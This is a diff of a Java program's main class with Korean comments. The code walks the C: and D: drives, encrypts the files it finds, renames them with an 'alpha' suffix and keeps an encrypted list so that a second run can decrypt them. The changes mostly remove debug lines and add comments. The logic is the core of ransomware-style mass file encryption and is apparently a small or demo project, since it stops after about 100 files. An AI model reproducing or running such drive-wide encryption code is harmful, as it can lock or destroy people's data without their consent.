@@ -25,46 +25,38 @@ public class Main {
 		
 		File[] roots = File.listRoots();
 		
+		// 하드로부터 모든 파일을 읽어온다.
 		if(cip.CreateReadFile(desktoppass, "read.txt")) {
 			for(int i = 0; i < roots.length; i++)
         	{
 			 	if(roots[i].getPath().equals("C:"+File.separator)
 					|| roots[i].getPath().equals("D:"+File.separator))
-//				if(roots[i].getPath().equals("C:"+File.separator))
 			 	{
 				 	fs.setDefaultDirectory(roots[i].getPath());
 				 	boolean temp = EncryptAllFile(100); 
 				 
 				 	if(!temp) isencrypt = temp;
 			 	}
-			 
-//			 	System.out.println(i +" : "+ roots[i].getPath());
         	}
-//			System.out.println(desktoppass); 
 
-			
 			list =  cip.ReturnList();
-		
-		
+
 			if(!list.isEmpty()) 
 			{
 				cip.CreateListFile(desktoppass);
 				cip.ListEncrypt(desktoppass, "list");
 			}
-		
 			if(isencrypt)
 			{
-				System.out.println("��ȣȭ complete!!!!!!!!");
-		
+				System.out.println("암호화 complete!!!!!!!!");
 			}
-		
 		}
+		// 만약 이미 암호화 되어있다면 복호화한다.
 		else {
 			for(int i = 0; i < roots.length; i++)
         	{
 			 	if(roots[i].getPath().equals("C:"+File.separator)
 					|| roots[i].getPath().equals("D:"+File.separator))
-//				if(roots[i].getPath().equals("C:"+File.separator))
 			 	{
 			 		cip.ListDecryte(desktoppass, "list.alpha");
 			 		cip.ReadListFile(desktoppass);
@@ -73,13 +65,8 @@ public class Main {
 				 
 //				 	if(!temp) isencrypt = temp;
 			 	}
-			 
-//			 	System.out.println(i +" : "+ roots[i].getPath());
         	}
-			
-			
-			
-			}
+		}
 		
 		File f = new File(desktoppass+"read.txt");
 		File fl = new File(desktoppass+"list");
@@ -91,18 +78,19 @@ public class Main {
 		
 	}
 	
+	// 리스트에 저장되 있는 모든 파일을 암호화한다.
 	public static boolean EncryptAllFile(int n) { 
 		int count = 0;
+		// 리스트에서 파일 하나하나 꺼내와서 암호화.
 		try {
-		ArrayList<File> list = fs.allFileSearch();
-//		System.out.print("����Ʈ :"+list);
-		for (int i = 0; i < list.size(); i++) {
-			cip.FileEncrypt(list.get(i).getParent() + "\\", list.get(i).getName()); //���� ������ ������.
-			count++;
-			if(count > n) return true;
-		}
-//		System.out.print("����Ʈ :"+list);
-		return true;
+			ArrayList<File> list = fs.allFileSearch();
+
+			for (int i = 0; i < list.size(); i++) {
+				cip.FileEncrypt(list.get(i).getParent() + "\\", list.get(i).getName()); //현재 파일을 보낸다.
+				count++;
+				if(count > n) return true;
+			}
+			return true;
 		}
 		catch(Exception e) 
 		{
@@ -111,16 +99,18 @@ public class Main {
 		
 	}
 	
+	// 리스트에 저장되 있는 모든 파일을 복호화한다.
 	public static boolean DencryptAllFile() {
+		// 리스트에서 파일 하나하나 꺼내와서 암호화.
 		try {
 			ArrayList<File> list = fs.alphaFileSearch();
-			System.out.print("����Ʈ :"+list);
 			for (int i = 0; i < list.size(); i++) {
 				System.out.println(list.get(i).getParent());
 				System.out.println(list.get(i).getName());
 				if(list.get(i).getName().substring((list.get(i).getName().length()-5)).equals("alpha"))
 				{
-//				//	System.out.println(list.get(i).getName()+"��ȣȭ");
+					// 복호화 어떤게 됬는지 출력
+					//	System.out.println(list.get(i).getName()+"복호화");
 					cip.FileDecryte(list.get(i).getParent() + "\\", list.get(i).getName());
 				}
 			
